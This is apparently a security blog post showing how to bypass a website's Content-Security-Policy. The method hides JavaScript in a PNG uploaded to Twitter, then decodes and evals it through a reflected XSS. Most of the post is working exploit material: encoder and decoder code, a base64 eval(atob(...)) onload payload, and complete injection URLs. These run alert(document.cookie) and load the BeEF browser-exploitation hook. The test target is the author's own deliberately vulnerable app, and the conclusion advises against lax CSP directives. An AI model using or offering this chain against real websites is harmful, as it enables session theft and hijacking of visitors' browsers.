
https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/
https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs

+++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++


How To Bypass CSP By Hiding JavaScript In A PNG Image
Hide a malicious JavaScript library into a PNG image and tweet it, then include it in a vulnerable website by exploiting a XSS bypassing its Content-Security-Policy (CSP). It's not Sci-Fi... it's HTML Canvas.

TL;DR - Using HTML Canvas you can hide any JavaScript code (or an entire library) into a PNG image by converting each source code character into a pixel. The image can then be uploaded onto a trusted website like Twitter or Google (usually whitelisted by CSP) and then loaded as a remote image in a HTML document. Finally, by using the canvas getImageData method, it's possible to extract the "hidden JavaScript" from the image and execute it. Sometimes this could lead to a Content-Security-Policy bypass making an attacker able to include an entire and external JavaScript library.


The Content-Security-Policy response header is being increasingly used due to its efficiency in preventing XSS, clickjacking and other code injection attacks. Yet many websites configure laxy policies to save themselves from false positives and whitelist whole domains instead of specific resources or by using unsafe-inline or unsafe-eval directives, which can lead to a policy bypass.

Reading an interesting article by Mike Parsons in which he shows how to use HTML Canvas to "store" JavaScript code into a PNG image, it occured to me that it could be the perfect CSP bypass technique to include an evil JavaScript external library exploiting a XSS vulnerability. It's all about using CanvasRenderingContext2D methods putImageData and getImageData and using String.charCodeAt to represent each character of the hidden text string.

The CanvasRenderingContext2D.putImageData() method of the Canvas 2D API paints data from the given ImageData object onto the canvas. If a dirty rectangle is provided, only the pixels from that rectangle are painted. This method is not affected by the canvas transformation matrix.
The CanvasRenderingContext2D method getImageData() of the Canvas 2D API returns an ImageData object representing the underlying pixel data for a specified portion of the canvas. This method is not affected by the canvas's transformation matrix. If the specified rectangle extends outside the bounds of the canvas, the pixels outside the canvas are transparent black in the returned ImageData object.
Hiding Text In A PNG Image Using Canvas
Following an example that you can copy and paste in your browser's JavaScript console to create a PNG image starting from a given string, for example: "Hello, World!". Open a new tab and go to about:blank then open your JavaScript console and paste the following code:

(function() {
    function encode(a) {
        if (a.length) {
            var c = a.length,
                e = Math.ceil(Math.sqrt(c / 3)),
                f = e,
                g = document.createElement("canvas"),
                h = g.getContext("2d");
            g.width = e, g.height = f;
            var j = h.getImageData(0, 0, e, f),
                k = j.data,
                l = 0;
            for (var m = 0; m < f; m++)
                for (var n = 0; n < e; n++) {
                    var o = 4 * (m * e) + 4 * n,
                        p = a[l++],
                        q = a[l++],
                        r = a[l++];
                    (p || q || r) && (p && (k[o] = ord(p)), q && (k[o + 1] = ord(q)), r && (k[o + 2] = ord(r)), k[o + 3] = 255)
                }
            return h.putImageData(j, 0, 0), h.canvas.toDataURL()
        }
    }
    var ord = function ord(a) {
        var c = a + "",
            e = c.charCodeAt(0);
        if (55296 <= e && 56319 >= e) {
            if (1 === c.length) return e;
            var f = c.charCodeAt(1);
            return 1024 * (e - 55296) + (f - 56320) + 65536
        }
        return 56320 <= e && 57343 >= e ? e : e
    },
    d = document,
    b = d.body,
    img = new Image;
    var stringenc = "Hello, World!";
    img.src = encode(stringenc), b.innerHTML = "", b.appendChild(img)
})();
The code above creates an image using the putImageData method representing each group of 3 characters of the "Hello, World!" string as levels of RGB (Red, Green and Blue) for each pixel. After running it in your browser's console, you'll see a little image on the top left:



generated image (zoom x10)
As I said before, each pixel of the image above represents 3 characters of the "hidden string". Using the charCodeAt function I can convert each character to an integer between 0 and 65535 representing its UTF-16 code unit. In a single pixel, the first converted character is for the Red channel, the second one for the Green channel and the last one for the Blue channel. The fourth value is the alpha level that in our example is always 255. For example, :

r = "H".charCodeAt(0)
g = "e".charCodeAt(0)
b = "l".charCodeAt(0)
a = 255
j.data = [r,g,b,a,...]
In the following schema, I try to explain better how characters of a string are distributed into the ImageData array:


Now we have a PNG image that represents the "Hello, World!" string. You can copy and paste the following code in your JavaScript console to convert the generated PNG image to the original text string:

t = document.getElementsByTagName("img")[0];
var s = String.fromCharCode, c = document.createElement("canvas");
var cs = c.style,
    cx = c.getContext("2d"),
    w = t.offsetWidth,
    h = t.offsetHeight;
c.width = w;
c.height = h;
cs.width = w + "px";
cs.height = h + "px";
cx.drawImage(t, 0, 0);
var x = cx.getImageData(0, 0, w, h).data;
var a = "",
    l = x.length,
    p = -1;
for (var i = 0; i < l; i += 4) {
    if (x[i + 0]) a += s(x[i + 0]);
    if (x[i + 1]) a += s(x[i + 1]);
    if (x[i + 2]) a += s(x[i + 2]);
}
console.log(a);
document.getElementsByTagName("body")[0].innerHTML=a;
As you can see above, the JavaScript code select the just created image element and, using the getImageData, converts it to the origin text string. When using getImageData, what happens is that you get an ImageData object with a data attribute that contains a big array. As shown before, for each pixel there're four entries in the ImageData array: r, g, b, and alpha. So, the array looks something like [pixel1R, pixel1G, pixel1B, pixel1Alpha, ..., pixelNR, pixelNG, pixelNB, pixelNAlpha].


A vulnerable website
Now we know how to "store" text string into an image and how to convert that image back to his origin string. Assume now to hide a JavaScript code instead a simple text string, and upload the generated PNG image on Twitter. A Content-Security-Policy that whitelist images from Twitter could be bypassed and a XSS could be exploited to load JavaScript contents from a "trusted" origin.

I've created an intentionally vulnerable web application that I'll use to test this technique. The webapp uses a Content-Security-Policy that prevents loading external JavaScript resources:


XSS vulnerable webapp

As you can see, the application uses a Content-Security-Policy that allow images from "self" and from Twitter, and allow JavaScript from "self", "inline" and "eval". Unfortunately, there're many websites that configure script-src directive allowing unsafe-inline and unsafe-eval to avoid false positives. Moreover, many websites whitelist whole domains instead of specific resources.

If you think this configuration is rare and nobody uses "unsafe-inline" and "unsafe-eval" on script-src directive, you're wrong. By a recent crawling of the Alexa Top 1m it seems that more than 5000 websites are using Content-Security-Policy with "unsafe-inline" and "unsafe-eval" on script-src or default-src directive:


The vulnerability is on the lang querystring argument that doesn't sanitize the user's input leading to an HTML injection and to a Reflected XSS. To exploit the XSS vulnerability on this test web application, I need to inject HTML syntax to close the src attribute and add a SCRIPT tag, then inject JavaScript code with something like ?lang="><script>alert(1)</script>.


exploiting Reflected XSS
Now I need to bypass the CSP and import an external JavaScript library with something like ?lang="><script+src="//example.com/evil.js"></script> that is blocked by CSP:


blocked external javascript by CSP
The screenshot above shows how CSP blocks an external JavaScript file at example.com/evil.js because it violates the script-src directive.

Upload the PNG/JS on Twitter
After doing some test, I figure out that Twitter shows an error when the uploaded image is too little. So I used a long JavaScript code (including random comments) to create a larger image:

(function() {
    function encode(a) {
        if (a.length) {
            var c = a.length,
                e = Math.ceil(Math.sqrt(c / 3)),
                f = e,
                g = document.createElement("canvas"),
                h = g.getContext("2d");
            g.width = e, g.height = f;
            var j = h.getImageData(0, 0, e, f),
                k = j.data,
                l = 0;
            for (var m = 0; m < f; m++)
                for (var n = 0; n < e; n++) {
                    var o = 4 * (m * e) + 4 * n,
                        p = a[l++],
                        q = a[l++],
                        r = a[l++];
                    (p || q || r) && (p && (k[o] = ord(p)), q && (k[o + 1] = ord(q)), r && (k[o + 2] = ord(r)), k[o + 3] = 255)
                }
            return h.putImageData(j, 0, 0), h.canvas.toDataURL()
        }
    }
    var ord = function ord(a) {
        var c = a + "",
            e = c.charCodeAt(0);
        if (55296 <= e && 56319 >= e) {
            if (1 === c.length) return e;
            var f = c.charCodeAt(1);
            return 1024 * (e - 55296) + (f - 56320) + 65536
        }
        return 56320 <= e && 57343 >= e ? e : e
    },
    d = document,
    b = d.body,
    img = new Image;
    var stringenc = "function asd() {\
        var d = document;\
        var c = 'cookie';\
        alert(d[c]);\
    };asd();/*Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam aliquam blandit metus vel elementum. Mauris mi tortor, congue eget fringilla id, tempus a tellus. Morbi laoreet vitae ipsum vel dapibus. Nunc eu faucibus ligula. Donec maximus malesuada justo. Nulla congue, risus quis dapibus porttitor, metus quam rutrum dolor, ac maximus nibh metus quis enim. Aenean hendrerit venenatis massa ac gravida. Donec at nisi quis ex sollicitudin bibendum sit amet ac quam.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Vestibulum tincidunt diam vel diam semper posuere. Nulla facilisi. Curabitur a facilisis lorem, eu porta leo. Sed pharetra eros et malesuada mattis. Donec tincidunt elementum mauris quis commodo. Donec nec vulputate nulla. Nunc luctus orci lacinia nunc sodales, vitae cursus quam tempor. Cras ullamcorper ullamcorper urna vitae pulvinar. Curabitur ac pretium felis. Vivamus vel scelerisque nisi. Pellentesque lacinia consequat nibh, vitae rhoncus tellus faucibus eget. Ut pulvinar est non tellus tristique sodales. Aenean eget velit non turpis tristique pretium id eu dolor. Nulla sed eros quis urna facilisis scelerisque. Nam orci neque, finibus eget odio et, elementum finibus erat.*/";
    img.src = encode(stringenc), b.innerHTML = "", b.appendChild(img)
})();

generated PNG image
then I've uploaded it on Twitter 😎


Image/JavaScript uploaded on Twitter
By loading the image from Twitter into an IMG tag, I can convert it to the origin hidden JavaScript code. As you can see in the screenshot below, the image contains a JavaScript function that executes alert of document.cookie value:


Now let's try to eval this JavaScript code in my vulnerable web application.

Exploiting: Bypass the CSP
As I said before, to exploit the test web application, I need to inject HTML syntax into the IMG tag to close the src attribute with something like ?lang="><script>alert(1)</script>.

To include the remote image from Twitter, I can just send this request:

/xss.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3Dpng%26name%3D120x120%22+id=%22jsimg%22%3E%3Ca+href=%22
The red part is the Twitter URL of our malicious PNG image. The blue part is an id attribute injected to be much easier to select the IMG tag. The green part is an A tag used just to prevent breaking the HTML syntax. Now I need to inject few JavaScript lines to convert the image into an external JavaScript library and bypass the CSP:

t = document.getElementById("jsimg");
var s = String.fromCharCode, c = document.createElement("canvas");
var cs = c.style,
    cx = c.getContext("2d"),
    w = t.offsetWidth,
    h = t.offsetHeight;
c.width = w;
c.height = h;
cs.width = w + "px";
cs.height = h + "px";
cx.drawImage(t, 0, 0);
var x = cx.getImageData(0, 0, w, h).data;
var a = "",
    l = x.length,
    p = -1;
for (var i = 0; i < l; i += 4) {
    if (x[i + 0]) a += s(x[i + 0]);
    if (x[i + 1]) a += s(x[i + 1]);
    if (x[i + 2]) a += s(x[i + 2]);
}
eval(a)
I've encoded it to base64 and now I use it inside an eval(atob("base64-encoded-js")) that I'll put inside an injected onload attribute:

onload='javascript:eval(atob("dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp"))'
And it becomes (in orange):

http://localhost:8111/xss.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3Dpng%26name%3D120x120%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27%3E%3Ca+href=%22
Sending the whole payload I got an error executing getImageData with the message "The canvas has been tainted by cross-origin data".


By reading the documentation, it seems that my browser intentionally blocks methods like getImageData when an image is loaded cross-origin. It seems that I just need to inject the crossorigin attribute:

HTML provides a crossorigin attribute for images that, in combination with an appropriate CORS header, allows images defined by the <img> element that are loaded from foreign origins to be used in a <canvas> as if they had been loaded from the current origin.
Because the pixels in a canvas's bitmap can come from a variety of sources, including images or videos retrieved from other hosts, it's inevitable that security problems may arise. As soon as you draw into a canvas any data that was loaded from another origin without CORS approval, the canvas becomes tainted. A tainted canvas is one which is no longer considered secure, and any attempts to retrieve image data back from the canvas will cause an exception to be thrown. If the source of the foreign content is an HTML <img> or SVG <svg> element, attempting to retrieve the contents of the canvas isn't allowed.
Fortunately, Twitter adds an Access-Control-Allow-Origin: * to all uploaded images 🥳 and it means that I just need to inject the crossorigin attribute to the IMG tag with the value "anonymous" to make it works.


By injecting the crossorigin attribute with value "anonymous" all works as expected and I've successfully executed the function alert(document.cookie) as shown in the screenshot below:


alert(document.cookie) from Twitter image
This is the whole payload I used:

/xss.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3Dpng%26name%3D120x120%22+crossorigin=%22anonymous%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27%3E%3Ca+href=%22

Convert BeEF hook.js
This is a test converting the BeEF's hook.js into a PNG image. BeEF is a Browser Exploitation Framework, a penetration testing tool that focuses on the web browser (you'll find more information on BeEF's website). I first base64 encoded it with curl -s 'http://localhost:3000/hook.js' | base64 -w0 and then I created the image as shown before.


hook.js to PNG

inject hook.js from PNG image

hook received from vulnerable webapp
Conclusion
I was able to bypass the Content-Security-Policy of a website loading an external JavaScript library hidden in a PNG image uploaded on Twitter. That was possible because the CSP was too lax and because Twitter sends a wildcard access origin response header to all uploaded images. I guess that the same technique works well on many other social networks, that's why you shouldn’t ever use "unsafe-inline" and "unsafe-eval" directives on your CSP. If you need help with your CSP, here you can find a useful online tool to check your policy and get good advices on how to fix it.

References
https://hackernoon.com/host-a-web-app-on-twitter-in-a-single-tweet-9aed28bdb350
https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/getImageData
https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/putImageData
https://developer.mozilla.org/en-US/docs/Web/HTML/CORS_enabled_image
https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/crossorigin
https://csp-evaluator.withgoogle.com/
